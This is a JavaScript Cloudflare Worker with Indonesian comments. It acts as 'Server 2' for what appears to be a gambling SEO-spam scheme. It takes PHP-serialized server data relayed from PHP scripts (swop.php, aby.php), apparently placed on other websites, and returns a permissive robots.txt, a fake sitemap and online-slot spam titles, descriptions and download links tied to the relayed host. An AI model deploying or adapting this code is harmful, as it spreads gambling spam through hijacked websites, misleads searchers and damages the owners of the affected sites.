// --- 1. FUNGSI PENGAMAN & SANITASI ---
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeText(str) {
  if (!str) return '';
  return str
    .replace(/[^a-zA-Z0-9\s]/g, ' ') // Hancurkan simbol selain huruf, angka, spasi
    .replace(/\s+/g, ' ')            // Rapikan spasi ganda
    .trim()
    .toUpperCase();
}

// --- 2. PENGEKSTRAK DATA SERIALISASI PHP ---
function extractPHPSerializedValue(serializedStr, key) {
  if (!serializedStr) return '';
  const regex = new RegExp(`s:\\d+:"${key}";(?:s:\\d+:"([^"]*)?"|i:(\\d+);|b:(0|1);)`, 'i');
  const match = serializedStr.match(regex);
  if (match) {
    return match[1] !== undefined ? match[1] : (match[2] !== undefined ? match[2] : match[3]);
  }
  return '';
}

export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);

  let requestURI = url.pathname;
  let queryString = url.search.replace('?', '');
  let httpHost = 'primestrategygh.com';
  let uriHost = '';
  let rawPostData = {};

  // Tangkap request POST (berisi parameter 'x' dari Server 1)
  if (request.method === 'POST') {
    try {
      const contentType = request.headers.get('content-type') || '';
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const formData = await request.formData();
        rawPostData = Object.fromEntries(formData);
      } else if (contentType.includes('application/json')) {
        rawPostData = await request.json();
      } else {
        const bodyText = await request.text();
        rawPostData = Object.fromEntries(new URLSearchParams(bodyText));
      }

      if (rawPostData.x) {
        const serializedData = rawPostData.x;
        const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
        const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
        let hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');
        const uriFilePost = extractPHPSerializedValue(serializedData, 'uri_name');

        if (uriFromPost) requestURI = uriFromPost;
        if (queryFromPost) queryString = queryFromPost;
        if (hostFromPost) httpHost = hostFromPost;

        const phpMatch = uriFilePost ? uriFilePost.match(/^(\/[^\?]+\.php)/) : null;
        if (phpMatch) {
          uriHost = phpMatch[1];
        }
      }
    } catch (e) {}
  }

  if (!httpHost) {
    httpHost = 'primestrategygh.com';
  }

  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();

  // --- 3. HANDLE ROBOTS.TXT ---
  if (fullCheck.includes('robots.txt')) {
    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
    return new Response(robotsOutput, {
      headers: { "Content-Type": "text/plain; charset=utf-8" }
    });
  }

  // --- 4. HANDLE SITEMAP ---
  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
    return new Response(sitemapOutput, {
      headers: { "Content-Type": "text/xml; charset=utf-8" }
    });
  }

  // --- 5. PARSING PATH & BRAND SEPERTI HOME CONTROLLER ---
  let cleanPath = requestURI.replace(/^\/+/, '');
  if (cleanPath.includes('swop.php')) {
    const parts = cleanPath.split('swop.php');
    cleanPath = parts[parts.length - 1].replace(/^\/+/, '');
  }

  // Ambil keyword/brand dari path atau query (contoh: /aby.php?download/uniktoto-slot atau /uniktoto-slot)
  let brandQuery = '';
  const downloadMatch = `${requestURI}?${queryString}`.match(/(?:download\/|slug=)([a-zA-Z0-9\-_]+)/i);
  if (downloadMatch && downloadMatch[1]) {
    brandQuery = downloadMatch[1];
  } else {
    const segments = cleanPath.split('/');
    brandQuery = segments[0] || 'random-app';
  }

  // Jika brand kosong / mengandung kata random, generate secara konsisten/acak
  const cleanBrandName = sanitizeText(brandQuery);
  const finalBrandTitle = cleanBrandName || 'APLIKASI TERPERCAYA';

  // --- 6. RENDER KONTEN (SEO, TITLE, DESKRIPSI) ---
  const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
  const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
  const downloadLink = `https://${httpHost}/download/${encodeURIComponent(brandQuery)}`;

  // Return response JSON atau HTML render ke client/Server 1
  return new Response(JSON.stringify({
    status: "success",
    engine: "Cloudflare Server 2 (MVC Emulation)",
    data: {
      host: httpHost,
      request_uri: requestURI,
      query_string: queryString,
      brand_code: finalBrandTitle,
      title: customTitle,
      description: customDesc,
      download_link: downloadLink
    }
  }, null, 2), {
    headers: { "Content-Type": "application/json; charset=utf-8" }
  });
}
